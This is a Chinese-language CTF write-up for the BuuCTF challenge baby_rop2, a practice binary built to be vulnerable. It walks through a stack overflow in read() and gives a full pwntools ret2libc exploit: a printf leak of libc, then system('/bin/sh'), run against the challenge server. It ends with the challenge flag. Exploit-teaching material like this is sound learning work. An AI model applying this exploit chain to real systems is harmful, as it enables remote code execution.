---
tags:
  - BuuCTF
  - 中等
  - ret2libc
---

# \[HarekazeCTF2019\] baby_rop2

## 前置工作

先 CheckSec，结果如下

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ checksec babyrop2
[*] '/home/ela/Pwn/babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用 IDA 64 打开主程序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[28]; // [rsp+0h] [rbp-20h] BYREF
  int v5; // [rsp+1Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("What's your name? ");
  v5 = read(0, buf, 0x100uLL);
  buf[v5 - 1] = 0;
  printf("Welcome to the Pwn World again, %s!\n", buf);
  return 0;
}
```

溢出点就在 `read()` 函数上，但是找了整个程序，没有 `system()` 和 `/bin/sh`，于是需要我们自己构造

用 ROPgadget 找到 `pop rdi; ret` 和 `pop rsi ; pop r15 ; ret`

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ ROPgadget --binary babyrop2 --only "pop|ret"
Gadgets information
============================================================
0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400730 : pop r14 ; pop r15 ; ret
0x0000000000400732 : pop r15 ; ret
0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005a0 : pop rbp ; ret
0x0000000000400733 : pop rdi ; ret
0x0000000000400731 : pop rsi ; pop r15 ; ret
0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004d1 : ret
0x0000000000400532 : ret 0x200a

Unique gadgets found: 12
```

找到了，分别是 `0x400733` 和 `0x400731`

## 构造 Payload 1

首先这个程序里面没有 `puts()` 可以调用，所以只能利用 `printf()` 来输出想要的函数的真实地址，我想要得到 `read()` 的真实地址

```python
main_addr = 0x400636
fmtstr_addr = 0x400770 # 即字符串 "Welcome to the Pwn World again, %s!\n" 的地址，需要利用 %s
pop_rdi_ret = 0x400733
pop_rsi_ret = 0x400731
printf_plt = elf.plt["printf"]
read_got = elf.got["read"]

payload1 = b"A"*(0x20+0x8)
payload1 += p64(pop_rdi_ret) + p64(fmtstr_addr) # 将字符串的地址载入到 RDI 寄存器
payload1 += p64(pop_rsi_ret) + p64(read_got) + p64(0) # 将 read() 函数的 GOT 载入到 RSI 寄存器，便于 printf() 读取
payload1 += p64(printf_plt) + p64(main_addr) # 调用 prinf() 函数，并在最后返回到 main() 函数
io.recvuntil("What's your name? ")
io.sendline(payload1)
```

## 计算 Libc 基址

```python
read_addr = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc = LibcSearcher("read", read_addr)
libc_base = read_addr - libc.dump("read")

system_base = libc_base + libc.dump("system")
bin_sh_base = libc_base + libc.dump("str_bin_sh")
```

## 构造 Payload 2

```python
payload2 = b"A"*(0x20+0x8) + p64(pop_rdi_ret) + p64(bin_sh_base) + p64(system_base)
io.recvuntil("What's your name? ")
io.sendline(payload2)
```

## 附总 Exp

```python
from pwn import *
from LibcSearcher import *

p64 = lambda x: pack(x, 64)
u64 = lambda x: unpack(x, 64)

io = remote("node4.buuoj.cn", 28396)
elf = ELF("./babyrop2")

main_addr = 0x400636
fmtstr_addr = 0x400770
pop_rdi_ret = 0x400733
pop_rsi_ret = 0x400731
printf_plt = elf.plt["printf"]
read_got = elf.got["read"]

payload1 = b"A"*(0x20+0x8)
payload1 += p64(pop_rdi_ret) + p64(fmtstr_addr)
payload1 += p64(pop_rsi_ret) + p64(read_got) + p64(0)
payload1 += p64(printf_plt) + p64(main_addr)
io.recvuntil("What's your name? ")
io.sendline(payload1)

read_addr = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc = LibcSearcher("read", read_addr)
libc_base = read_addr - libc.dump("read")

system_base = libc_base + libc.dump("system")
bin_sh_base = libc_base + libc.dump("str_bin_sh")

payload2 = b"A"*(0x20+0x8) + p64(pop_rdi_ret) + p64(bin_sh_base) + p64(system_base)
io.recvuntil("What's your name? ")
io.sendline(payload2)

io.interactive()

```

LibcSearcher 匹配到的 Libc 中，应当选取 `libc6_2.23-0ubuntu11_amd64`

最后找到 Flag 为 `flag{e943695b-4016-4b6f-bc36-214af216a5a0}`